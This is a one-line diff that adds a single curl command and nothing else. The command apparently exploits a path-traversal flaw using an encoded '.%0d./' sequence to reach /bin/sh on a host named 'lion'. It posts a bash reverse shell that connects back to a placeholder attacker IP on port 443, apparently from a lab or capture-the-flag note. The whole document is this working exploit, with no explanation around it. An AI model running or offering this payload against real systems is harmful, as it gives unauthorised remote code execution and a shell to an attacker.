@@ -1,0 +1,1 @@
+curl -s -X POST 'http://lion ip/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/your ip/443 0>&1"'
